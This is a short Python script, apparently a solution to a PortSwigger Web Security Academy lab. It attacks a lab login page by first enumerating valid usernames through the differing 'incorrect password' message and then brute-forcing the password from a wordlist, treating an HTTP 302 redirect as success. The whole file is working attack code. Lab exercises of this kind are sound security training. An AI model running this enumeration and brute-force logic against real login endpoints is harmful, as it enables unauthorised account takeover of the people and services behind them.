import requests

url = "https://0a95008c049881bf8021765a00fd00a0.web-security-academy.net/login"



def find_user():
    with open("users.txt", "r") as file:
        users = file.read().splitlines()

    for user in users:
        data = {"username": user, "password": "deneme"}
        response = requests.post(url, data=data)
        if "incorrect password" in response.text.lower():
            return user

def find_password(user):
    with open("passwords.txt", "r") as file:
        passwords = file.read().splitlines()

    for password in passwords:
        data = {"username": user, "password": password}
        response = requests.post(url, data=data, allow_redirects=False)
        if response.status_code == 302:
            return password

user = find_user()
print(f"valid username: {user}")

password = find_password(user)
print(f"valid password: {password}")
